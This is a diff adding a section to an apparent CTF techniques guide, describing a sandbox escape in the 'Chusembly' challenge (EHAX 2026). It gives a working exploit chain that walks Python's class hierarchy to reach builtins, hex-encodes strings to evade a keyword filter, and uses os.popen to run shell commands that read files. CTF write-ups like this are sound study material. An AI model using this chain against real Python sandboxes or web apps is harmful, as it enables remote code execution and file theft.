@@ -19,6 +19,7 @@
   - [Why It Works](#why-it-works)
   - [Red Flags in Challenges](#red-flags-in-challenges)
   - [Quick Test Script](#quick-test-script)
+- [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
 - [memfd_create Packed Binaries](#memfd_create-packed-binaries)
 - [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
 - [References](#references)
@@ -322,6 +323,47 @@ find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
 
 ---
 
+## Custom Assembly Language Sandbox Escape (EHAX 2026)
+
+**Pattern (Chusembly):** Web app with custom instruction set (LD, PUSH, PROP, CALL, IDX, etc.) running on a Python backend. Safety check only blocks the word "flag" in source code.
+
+**Key insight:** `PROP` (property access) and `CALL` (function invocation) instructions allow traversing Python's MRO chain from any object to achieve RCE, similar to Jinja2 SSTI.
+
+**Exploit chain:**
+```
+LD 0x48656c6c6f A     # Load "Hello" string into register A
+PROP __class__ A      # str → <class 'str'>
+PROP __base__ E       # str → <class 'object'> (E = result register)
+PROP __subclasses__ E # object → bound method
+CALL E                # object.__subclasses__() → list of all classes
+# Find os._wrap_close at index 138 (varies by Python version)
+IDX 138 E             # subclasses[138] = os._wrap_close
+PROP __init__ E       # get __init__ method
+PROP __globals__ E    # access function globals
+# Use __getitem__ to access builtins without triggering keyword filter
+PUSH 0x5f5f6275696c74696e735f5f  # "__builtins__" as hex
+CALL __getitem__ E               # globals["__builtins__"]
+# Bypass "flag" keyword filter with hex encoding
+PUSH 0x666c61672e747874          # "flag.txt" as hex
+CALL open E                      # open("flag.txt")
+CALL read E                      # read file contents
+STDOUT E                         # print flag
+```
+
+**Filter bypass techniques:**
+- **Hex-encoded strings:** `0x666c61672e747874` → `"flag.txt"` bypasses keyword filters
+- **os.popen for shell:** If file path is unknown, use `os.popen('ls /').read()` then `os.popen('cat /flag*').read()`
+- **Subclass index discovery:** Iterate through `__subclasses__()` list to find useful classes (os._wrap_close, subprocess.Popen, etc.)
+
+**General approach for custom language challenges:**
+1. **Read the docs:** Check `/docs`, `/help`, `/api` endpoints for instruction reference
+2. **Find the result register:** Many custom languages have a special register for return values
+3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
+4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
+5. **Error messages leak info:** Intentional errors reveal Python internals and available classes
+
+---
+
 ## memfd_create Packed Binaries
 
 ```python
@@ -412,3 +454,4 @@ def is_winning(state):
 - 0xL4ugh CTF: PyInstaller + opcode remapping
 - 0xFun 2026 "MazeRunna": Roblox version history + binary place file parsing
 - EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
+- EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE
